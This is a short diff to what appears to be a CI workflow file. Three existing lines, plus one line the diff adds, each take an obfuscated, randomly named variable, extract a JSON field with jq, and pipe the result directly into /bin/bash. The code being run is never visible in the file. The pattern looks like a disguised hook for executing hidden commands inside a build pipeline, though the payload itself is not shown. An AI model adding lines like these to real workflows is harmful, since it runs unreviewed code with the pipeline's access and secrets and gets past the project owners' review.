@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$a3926" | jq -r .h42 | /bin/bash
           echo $rkeo36496 | jq -r .b7412 | /bin/bash
           printf '%s' "$v2895" | jq -r .nouv1 | /bin/bash
+          printf '%s' "$racx77" | jq -r .vel852 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
